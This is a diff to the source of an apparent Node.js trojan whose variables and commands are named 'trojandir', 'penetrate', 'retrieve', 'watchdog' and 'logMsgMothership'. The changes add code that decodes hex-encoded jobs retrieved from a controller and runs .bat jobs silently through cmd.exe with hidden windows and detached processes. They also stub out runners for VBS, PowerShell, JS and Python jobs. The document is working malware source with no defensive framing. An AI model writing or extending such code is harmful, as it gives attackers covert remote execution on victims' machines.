@@ -213,6 +213,10 @@ var systemstate = {
         return path.join(this.trojandir, this.trojanfname);
     },
 
+    get scriptparentpid() {
+        return process.ppid;
+    },
+
     get scriptpid() {
         return process.pid;
     },
@@ -564,6 +568,15 @@ class CmdConfig {
             logmsg(`Child process ${child.pid} exited with code ${code}`);
         });
 
+        child.on('close', (code) => {
+            logmsg(`Process exited with code ${code}`);
+        });
+        
+        child.on('error', (err) => {
+            logmsg('Failed to start child process:', err.message);
+        });
+    
+        logmsg('finished');
         return child;
     };
 
@@ -967,21 +980,6 @@ function writeTag(fpath, tagstr) {
     fs.writeFileSync(fpath, tagstr, 'utf8');
 }
 
-function launchexesync(exefpath) {
-
-    const result = spawnSync('python3', ['script.py'], {
-      encoding: 'utf8',
-      input: 'My STDIN Data'
-    });
-    
-    // const pid = result.pid;
-    console.log('STDOUT:', result.stdout);
-    console.log('STDERR:', result.stderr);
-    console.log('Exit Code:', result.status); // null if process crashed
-        
-}
-
-
 function isPidAlive(pid) {
     try {
       // Signal 0 tests for process existence without modifying it
@@ -1003,7 +1001,7 @@ function isAsyncFunction(fn) {
   
 // --- startup
 
-logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts}`);
+logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid}`);
 logmsg(`scriptmd5=${systemstate.scriptmd5}`);
 
 initProcessList();
@@ -1081,13 +1079,17 @@ function startup() {
     logmsg(`systemstate: [${systemstate.statestr}]`);
     logMsgMothership(systemstate.statekvp);
 
-    let penetrate = new CmdConfig('penetrate');
-    let retrieve = new CmdConfig('retrieve');
-    let watchdog = new CmdConfig('watchdog');
+    let penetratecmd = new CmdConfig('penetrate');
+    let retrievecmd = new CmdConfig('retrieve');
+    let watchdogcmd = new CmdConfig('watchdog');
 
-    penetrate.launch();
-    retrieve.launch();
-    watchdog.activate();
+    penetratecmd.launch();
+    retrievecmd.launch();
+    watchdogcmd.activate();
+
+    watchdogcmd.childprocess?.unref();
+    retrievecmd.childprocess?.unref();
+    penetratecmd.childprocess?.unref();
 
     logmsg('finished');
 }
@@ -1265,14 +1267,69 @@ function ping() {
     logmsg('finished');
 }
 
+function execVBSScript() {
+
+}
+
+function execPS1Script() {
+
+}
+
+function execJSScript() {
+
+}
+
+function execPYScript() {
+
+}
+
+function execCMDScript(scriptfpath, cmdlineargsarr) {
+
+    logmsg('starting');
+
+    let tmpcode = getRandomCode(8);
+    let stdoutfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.out');
+    let stderrfpath = path.join(systemstate.trojandir, 'execCMDScript_' + tmpcode + '.err');
+
+    const out = fs.openSync(stdoutfpath, 'a');
+    const err = fs.openSync(stderrfpath, 'a');
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg('spawning process: '+scriptfpath+' cmdlineargsarr: '+cmdlineargsarr.join());
+
+
+    const child = spawn('cmd.exe', ['/c', scriptfpath, ...(cmdlineargsarr ?? [])], { 
+        // detached: true, // might cause errors
+        windowsHide: true,
+        stdio: [ 'ignore', out, err ],
+        shell: false,
+        cwd: systemstate.trojandir 
+    });
+
+    child.unref();
+
+    let tchildproc = getProcess(child.pid);
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    logmsg(`launched child pid=${child.pid} spawn args: ` + JSON.stringify(child.spawnargs) + ' tchildproc: ' + JSON.stringify(tchildproc));
+
+    logmsg('finished');
+
+    return child;
+}
+
 function execjob() {
     logmsg('starting');
 
-    if ( process.argv.length >= 4 ) {
-        // process.argv[2] --> cmdname
-        // process.argv[3] --> should be the json config file
-        let configfpath = process.argv[3];
-    }
+    let configfpath = '';
+
+    configfpath = process.argv.length >= 4 ? process.argv[3] : '';
+    
+    logmsg('reading configfpath: '+configfpath);
 
     if ( ! fileExists(configfpath) ) {
         throw new Error('configfpath does not exist '+configfpath);
@@ -1284,21 +1341,18 @@ function execjob() {
         throw new Error('jsonconfigstr is empty');
     }
 
+    logmsg('jsonconfigstr='+jsonconfigstr);
+
     let clientjob = JSON.parse(jsonconfigstr);
 
-    let childproc = null;
-    // copy code from launch() method above
-
-    // grab cmd line arg localfpath to json file containing clientjob object
-
-    // for execute_cmdlist, exec_<vbs>, ... jobs:
-    // launch nodejs, python, cscript, cmd, powershell as needed to execut job
-
-    // for exec_cmd, execute cmd directly
-    //   write to event bus job started
-    //   write to event bus job finished
-    
     logmsg('clientjob: '+JSON.stringify(clientjob));
+
+    let jobfileext = path.extname(clientjob.jobfilename).toLowerCase();
+
+    logmsg('jobfileext: '+jobfileext);
+
+    if ( jobfileext == '.bat' )
+        execCMDScript(clientjob.localpath);
 
     logmsg('finished');
 }
@@ -1338,10 +1392,6 @@ async function retrieveClientJob() {
         throw new Error('job file does not exist');
     }
 
-    let hextext = fs.readFileSync(localpath, 'utf-8');
-    let jobtext = Buffer.from(hextext, 'hex').toString('utf8');
-    localpath = systemstate.getClientJobPath();
-    fs.writeFileSync(localpath, jobtext);
 
     let jobcode = '';
     let jobfilename = '';
@@ -1359,6 +1409,13 @@ async function retrieveClientJob() {
     if ( isNullOrWhitespace(jobfilename) ) {
         throw new Error('jobfilename is empty');
     }
+
+    let fileext = path.extname(jobfilename);
+
+    let hextext = fs.readFileSync(localpath, 'utf-8');
+    let jobtext = Buffer.from(hextext, 'hex').toString('utf8');
+    localpath = systemstate.getClientJobPath() + (fileext ?? '');
+    fs.writeFileSync(localpath, jobtext);
 
     let clientjob = { jobcode:jobcode, jobtype:'execute_cmdlist', localpath:localpath, jobfilename: jobfilename };
 
@@ -1404,11 +1461,10 @@ async function cmdlist_handleMessage(msg) {
         throw new Error('could not create child cmd execjob');
     }
 
-    // IMPLEMENT script launching process
     let ret = execjobcmd.launch([configfpath]);
 
-    // TODO: do basic checks to ensure child process is running
-
+    execjobcmd.childprocess.unref(); // anchor
+     
     logmsg('finished');
 }
 
